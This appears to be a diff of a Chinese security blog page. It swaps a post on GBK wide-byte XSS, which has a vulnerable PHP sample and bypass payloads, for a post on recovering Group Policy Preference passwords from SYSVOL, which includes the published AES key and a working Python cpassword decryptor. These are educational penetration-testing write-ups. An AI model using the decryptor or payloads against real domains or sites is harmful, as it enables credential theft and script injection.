@@ -35,34 +35,28 @@
   <link rel="shorticon icon" type="image/x-icon" href="/favicon.ico?v=0.4.5.1" />
 
 
-<meta name="description" content="什么是宽字节？
+<meta name="description" content="在利用域凭据过程中，除了通过Mimikatz和WCE从内存读取明文密码外，还可以通过域共享文件夹SYSVOL组策略文件获取哈希码。
 
-GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，确切地说应该称为“双字节”。宽字节带来的安全问题主要是吃ASCII字符（一字节）的现象。
+组策略首选项（Group Policy Preference, GPP）借助组策略对象（Group Policy Object, GPO）实现了对域中所有资源的管理。
 
-首先，字符集编码处理不一致除了引起XSS绕过问题，还常常导致SQL注入，命令执行等一系列安全问题。
-比如，下面这个PHP示例，在magic_gpc=on的情况下，如何触发XSS？
-&amp;lt;?php h">
+这大大简化了系统管理工作。然而GPP有一个特殊的功能，它可以指定某个计算机的某个域账户为域中所有">
 <meta property="og:type" content="article">
-<meta property="og:title" content="XSS中的宽字节编码问题">
-<meta property="og:url" content="http://www.rootat.net/2015/10/09/WideByteXSS/index.html">
+<meta property="og:title" content="利用域凭据：解密GPP中的管理员密码">
+<meta property="og:url" content="http://www.rootat.net/2015/08/13/GPPcpassword/index.html">
 <meta property="og:site_name" content="root@Zeroh">
-<meta property="og:description" content="什么是宽字节？
+<meta property="og:description" content="在利用域凭据过程中，除了通过Mimikatz和WCE从内存读取明文密码外，还可以通过域共享文件夹SYSVOL组策略文件获取哈希码。
 
-GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，确切地说应该称为“双字节”。宽字节带来的安全问题主要是吃ASCII字符（一字节）的现象。
+组策略首选项（Group Policy Preference, GPP）借助组策略对象（Group Policy Object, GPO）实现了对域中所有资源的管理。
 
-首先，字符集编码处理不一致除了引起XSS绕过问题，还常常导致SQL注入，命令执行等一系列安全问题。
-比如，下面这个PHP示例，在magic_gpc=on的情况下，如何触发XSS？
-&amp;lt;?php h">
-<meta property="og:updated_time" content="2016-03-09T03:12:13.807Z">
+这大大简化了系统管理工作。然而GPP有一个特殊的功能，它可以指定某个计算机的某个域账户为域中所有">
+<meta property="og:updated_time" content="2016-03-09T06:57:11.886Z">
 <meta name="twitter:card" content="summary">
-<meta name="twitter:title" content="XSS中的宽字节编码问题">
-<meta name="twitter:description" content="什么是宽字节？
+<meta name="twitter:title" content="利用域凭据：解密GPP中的管理员密码">
+<meta name="twitter:description" content="在利用域凭据过程中，除了通过Mimikatz和WCE从内存读取明文密码外，还可以通过域共享文件夹SYSVOL组策略文件获取哈希码。
 
-GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，确切地说应该称为“双字节”。宽字节带来的安全问题主要是吃ASCII字符（一字节）的现象。
+组策略首选项（Group Policy Preference, GPP）借助组策略对象（Group Policy Object, GPO）实现了对域中所有资源的管理。
 
-首先，字符集编码处理不一致除了引起XSS绕过问题，还常常导致SQL注入，命令执行等一系列安全问题。
-比如，下面这个PHP示例，在magic_gpc=on的情况下，如何触发XSS？
-&amp;lt;?php h">
+这大大简化了系统管理工作。然而GPP有一个特殊的功能，它可以指定某个计算机的某个域账户为域中所有">
 
 
 <script type="text/javascript" id="hexo.configuration">
@@ -72,7 +66,7 @@ GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，确
   };
 </script>
 
-  <title> XSS中的宽字节编码问题 | root@Zeroh </title>
+  <title> 利用域凭据：解密GPP中的管理员密码 | root@Zeroh </title>
 </head>
 
 <body itemscope itemtype="http://schema.org/WebPage" lang="zh-Hans">
@@ -163,7 +157,7 @@ GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，确
           
           
             
-              XSS中的宽字节编码问题
+              利用域凭据：解密GPP中的管理员密码
             
           
         </h1>
@@ -172,8 +166,8 @@ GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，确
       <div class="post-meta">
         <span class="post-time">
           发表于
-          <time itemprop="dateCreated" datetime="2015-10-09T11:07:26+08:00" content="2015-10-09">
-            2015-10-09
+          <time itemprop="dateCreated" datetime="2015-08-13T14:53:10+08:00" content="2015-08-13">
+            2015-08-13
           </time>
         </span>
 
@@ -183,8 +177,8 @@ GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，确
           
             <span class="post-comments-count">
             &nbsp; | &nbsp;
-            <a href="/2015/10/09/WideByteXSS/#comments" itemprop="discussionUrl">
-              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/10/09/WideByteXSS/" itemprop="commentsCount"></span>
+            <a href="/2015/08/13/GPPcpassword/#comments" itemprop="discussionUrl">
+              <span class="post-comments-count disqus-comment-count" data-disqus-identifier="2015/08/13/GPPcpassword/" itemprop="commentsCount"></span>
             </a>
           </span>
           
@@ -198,33 +192,46 @@ GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，确
       
 
       
-        <span itemprop="articleBody"><p><strong>什么是宽字节？</strong></p>
+        <span itemprop="articleBody"><p>在利用域凭据过程中，除了通过Mimikatz和WCE从内存读取明文密码外，还可以通过域共享文件夹SYSVOL组策略文件获取哈希码。</p>
 <blockquote>
-<p>GB2312、GBK、GB18030、BIG5、Shift_JIS等这些都是常说的宽字节，确切地说应该称为“<strong>双字节</strong>”。宽字节带来的安全问题主要是吃ASCII字符（一字节）的现象。</p>
+<p>组策略首选项（Group Policy Preference, GPP）借助组策略对象（Group Policy Object, GPO）实现了对域中所有资源的管理。</p>
 </blockquote>
-<p>首先，字符集编码处理不一致除了引起XSS绕过问题，还常常导致SQL注入，命令执行等一系列安全问题。</p>
-<p>比如，下面这个PHP示例，在magic_gpc=on的情况下，如何触发XSS？</p>
-<pre><code><span class="xml"><span class="php"><span class="preprocessor">&lt;?php</span> header(“Content-Type: text/html;charset=GBK”);<span class="preprocessor">?&gt;</span></span>
-<span class="tag">&lt;<span class="title">head</span>
-&lt;<span class="attribute">title</span>&gt;</span>xss<span class="tag">&lt;/<span class="title">title</span>&gt;</span>
-<span class="tag">&lt;/<span class="title">head</span>&gt;</span>
-<span class="tag">&lt;<span class="title">script</span>&gt;</span><span class="handlebars"><span class="xml">
-a=”<span class="php"><span class="preprocessor">&lt;?php</span> <span class="keyword">echo</span> <span class="variable">$_GET</span>[‘x’];<span class="preprocessor">?&gt;</span></span>”;
-</span></span><span class="tag">&lt;/<span class="title">script</span>&gt;</span></span>
-</code></pre><p>我们会想到，需要闭合双引号才行，如果只是提交如下语句：</p>
-<pre><code>gb.php?x=<span class="number">1</span>”;alert(<span class="number">1</span>)<span class="comment">//</span>
-</code></pre><p>双引号会被转义成\”,导致闭合失败:</p>
-<pre><code>a=”<span class="number">1</span>\”;alert(<span class="number">1</span>)<span class="comment">//”;</span>
-</code></pre><p>由于这个网页头部响应指明了这是GBK编码，GBK编码第一字节（高字节）的范围是0x81~0xFE,第二字节（低字节）的范围是0x40~0x7E与0x80~0xFE，这样的十六进制表示。而\符号的十六进制表示为0x5C，正好在GBK的低字节中，如果之前有一个高字节，那么正好会被组成一个合法字符，于是提交如下：</p>
-<pre><code>gb.php?x=<span class="number">1</span>%<span class="number">81</span>”alert(<span class="number">1</span>)<span class="comment">//</span>
-</code></pre><p>双引号会继续被转义成\”，最终如下：</p>
-<pre><code>a=”<span class="number">1</span>[<span class="number">0x81</span>]\”;alert(<span class="number">1</span>)<span class="comment">//”;</span>
-</code></pre><p>[0x81]\组成了一个合法字符，于是之后的双引号就产生闭合，这样我们就成功触发了XSS。</p>
-<blockquote>
-<p>这些宽字节编码的高低位范围都不太相同，具体可以查看相关维基百科。</p>
-</blockquote>
-<p>这里有一点要注意，GB2312是被GBK兼容的，它的高位范围是0xA1~0xF7,低位范围是0xA1~0xFE(0x5c不在该范围内)，把上面的PHP代码的GBK改为GB2312，在浏览器中处理行为同GBK，也许是由于GBK兼容GB2312，浏览器都做了同样的兼容：把GB2312统一按GBK处理。</p>
-<p>参考《WEB前端黑客技术揭秘》</p>
+<p>这大大简化了系统管理工作。然而GPP有一个特殊的功能，它可以指定某个计算机的某个域账户为域中所有的本地计算机管理账户。为什么有些人会使用这个功能呢？原因或许是他们就是想在所有计算机上指定某个新管理员，或许他们就是想在每台主机上更新本地账户的密码。一旦管理员使用了这个机制更新了GPO，那么所有的工作站将会拥有这个账户。在GPP的域环境下，这个账户的信息存储在域里，而且所有的AD用户都可以读取它。<br>通过GPP发布的账户信息全部存储在\[Domain Controller]\SYSVOL[Domain]\Policies中。其中的Groups.xml文件中就有cpassword的哈希值。有关字段的具体内容大致如下:</p>
+<pre><code><span class="tag">&lt;<span class="title">Properties</span> <span class="attribute">action</span>=<span class="value">”U”</span> <span class="attribute">userDSN</span>=<span class="value">”0”</span> <span class="attribute">dsn</span>=<span class="value">”test”</span> <span class="attribute">driver</span>=<span class="value">”SQL</span> <span class="attribute">Server</span>” <span class="attribute">description</span>=<span class="value">”test</span> <span class="attribute">data</span> <span class="attribute">source</span>”<span class="attribute">username</span>=<span class="value">”testusername”</span> <span class="attribute">cpassword</span>=<span class="value">”AzVJmXh</span>/<span class="attribute">J9KrU5n0czX1uBPLSUjzFE8j7OltPD8tLk</span>”/&gt;</span>
+</code></pre><p>Cpassword变量采取了AES的加密算法，微软已经公开了它的对称AES密钥。在加密密钥已知的情况下，我们就可以破解GPP中本地管理员账户的密码。Metasploit的POST模块以及支持这种破解功能。下面是python代码的实现：</p>
+<pre><code><span class="comment">#!/usr/bin/python</span>
+<span class="comment">#</span>
+<span class="comment"># Gpprefdecrypt - Decrypt the password of local users added via Windows 2008 Group Policy Preferences.</span>
+<span class="comment">#</span>
+<span class="comment"># This tool decrypts the cpassword attribute value embedded in the Groups.xml file stored in the domain controller's Sysvol share.</span>
+<span class="comment">#</span>
+
+<span class="keyword">import</span> sys
+<span class="keyword">from</span> Crypto.Cipher <span class="keyword">import</span> AES
+<span class="keyword">from</span> base64 <span class="keyword">import</span> b64decode
+
+<span class="keyword">if</span>(len(sys.argv) != <span class="number">2</span>):
+  <span class="keyword">print</span> <span class="string">"Usage: gpprefdecrypt.py &lt;cpassword&gt;"</span>
+  sys.exit(<span class="number">0</span>)
+
+<span class="comment"># Init the key</span>
+<span class="comment"># From MSDN: http://msdn.microsoft.com/en-us/library/2c15cbf0-f086-4c74-8b70-1f2fa45dd4be%28v=PROT.13%29#endNote2</span>
+key = <span class="string">"""
+4e 99 06 e8  fc b6 6c c9  fa f4 93 10  62 0f fe e8
+f4 96 e8 06  cc 05 79 90  20 9b 09 a4  33 b6 6c 1b
+"""</span>.replace(<span class="string">" "</span>,<span class="string">""</span>).replace(<span class="string">"\n"</span>,<span class="string">""</span>).decode(<span class="string">'hex'</span>)
+
+<span class="comment"># Add padding to the base64 string and decode it</span>
+cpassword = sys.argv[<span class="number">1</span>]
+cpassword += <span class="string">"="</span> * ((<span class="number">4</span> - len(sys.argv[<span class="number">1</span>]) % <span class="number">4</span>) % <span class="number">4</span>)
+password = b64decode(cpassword)
+
+<span class="comment"># Decrypt the password</span>
+o = AES.new(key, AES.MODE_CBC).decrypt(password)
+
+<span class="comment"># Print it</span>
+<span class="keyword">print</span> o[:-ord(o[-<span class="number">1</span>])].decode(<span class="string">'utf16'</span>)
+</code></pre><p>引用: <a href="http://pastebin.com/TE3fvhEh" target="_blank" rel="external">http://pastebin.com/TE3fvhEh</a></p>
 </span>
       
     </div>
@@ -236,11 +243,13 @@ a=”<span class="php"><span class="preprocessor">&lt;?php</span> <span class="k
         <div class="post-nav">
           <div class="post-nav-prev post-nav-item">
             
+              <a href="/2015/09/06/SSHReverseTunnel/" rel="prev">使用SSH反向隧道访问内网设备</a>
+            
           </div>
 
           <div class="post-nav-next post-nav-item">
             
-              <a href="/2015/09/06/SSHReverseTunnel/" rel="next">使用SSH反向隧道访问内网设备</a>
+              <a href="/2015/05/17/Travel/" rel="next">旅行</a>
             
           </div>
         </div>
@@ -402,9 +411,9 @@ a=”<span class="php"><span class="preprocessor">&lt;?php</span> <span class="k
 
     <script type="text/javascript">
       var disqus_shortname = 'rootat';
-      var disqus_identifier = '2015/10/09/WideByteXSS/';
-      var disqus_title = 'XSS中的宽字节编码问题';
-      var disqus_url = 'http://www.rootat.net/2015/10/09/WideByteXSS/';
+      var disqus_identifier = '2015/08/13/GPPcpassword/';
+      var disqus_title = '利用域凭据：解密GPP中的管理员密码';
+      var disqus_url = 'http://www.rootat.net/2015/08/13/GPPcpassword/';
 
       function run_disqus_script(disqus_script){
         var dsq = document.createElement('script');
